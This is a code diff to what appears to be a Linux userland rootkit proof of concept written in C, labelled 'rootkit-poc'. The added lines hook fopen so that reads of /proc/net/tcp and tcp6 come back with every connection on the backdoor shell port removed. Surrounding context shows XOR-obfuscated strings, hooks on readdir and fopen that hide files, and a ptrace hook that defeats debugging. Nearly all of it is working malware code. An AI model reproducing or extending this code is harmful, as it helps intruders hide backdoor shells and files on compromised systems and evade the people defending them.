@@ -73,7 +73,32 @@ int is_owner(void) {
     return owner;
 }
 
+int is_procnet(const char *filename) {
+    if (is_owner()) {
+        return 0;
+    }
+
+    char *proc_net_tcp = strdup(PROC_NET_TCP);
+    char *proc_net_tcp6 = strdup(PROC_NET_TCP6);
+
+    xor(proc_net_tcp);
+    xor(proc_net_tcp6);
+
+    if ((strcmp(filename, proc_net_tcp) == 0) || (strcmp(filename, proc_net_tcp6) == 0)) {
+        cleanup(proc_net_tcp, strlen(proc_net_tcp));
+        cleanup(proc_net_tcp6, strlen(proc_net_tcp6));
+        return 1;
+    }
+
+    cleanup(proc_net_tcp, strlen(proc_net_tcp));
+    cleanup(proc_net_tcp6, strlen(proc_net_tcp6));
+
+    return 0;
+}
+
 int is_invisible(const char *path) {
+    init(); // hook configurations
+
     if (is_owner()) {
         return 0;
     }
@@ -195,6 +220,46 @@ void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char
     return;
 }
 
+FILE *hide_ports(const char *filename) {
+    char line[LINE_MAX];
+    char *proc_net_tcp = strdup(PROC_NET_TCP);
+    char *proc_net_tcp6 = strdup(PROC_NET_TCP6);
+
+    xor(proc_net_tcp);
+    xor(proc_net_tcp6);
+
+    unsigned long rxq, txq, time_len, retr, inode;
+    int local_port, rem_port, d, state, uid, timer_run, timeout;
+    char rem_addr[128], local_addr[128], more[512];
+
+    FILE *tmp = tmpfile();
+    FILE *pnt = syscall_list[SYS_FOPEN].syscall_func(filename, "r");
+
+    while (fgets(line, LINE_MAX, pnt) != NULL) {
+        char *scanf_line = strdup(SCANF_LINE);
+
+        xor(scanf_line);
+
+        sscanf(line, scanf_line, &d, local_addr, &local_port, rem_addr, &rem_port, &state, &txq, &rxq, &timer_run, &time_len, &retr, &uid, &timeout, &inode, more);
+
+        cleanup(scanf_line, strlen(scanf_line));
+
+        if ((rem_port == SHELL_SERVER_PORT) || (local_port == SHELL_SERVER_PORT)) {
+            continue;
+        } else {
+            fputs(line, tmp);
+        }
+    }
+
+    cleanup(proc_net_tcp, strlen(proc_net_tcp));
+    cleanup(proc_net_tcp6, strlen(proc_net_tcp6));
+
+    fclose(pnt);
+    fseek(tmp, 0, SEEK_SET);
+
+    return tmp;
+}
+
 // Hooked ptrace function to exit on debug
 long ptrace(void *request, pid_t pid, void *addr, void *data) {
     char *anti_debug_msg = strdup(ANTI_DEBUG_MSG);
@@ -242,6 +307,10 @@ struct dirent *readdir(DIR *dirp) {
 // Hooked fopen function to hide invisible files
 FILE *fopen(const char *filename, const char *mode) {
     DEBUG("[rootkit-poc]: fopen hooked %s\n", filename);
+
+    if (is_procnet(filename)) {
+        return hide_ports(filename);
+    }
 
     if (is_invisible(filename)) {
         errno = ENOENT;
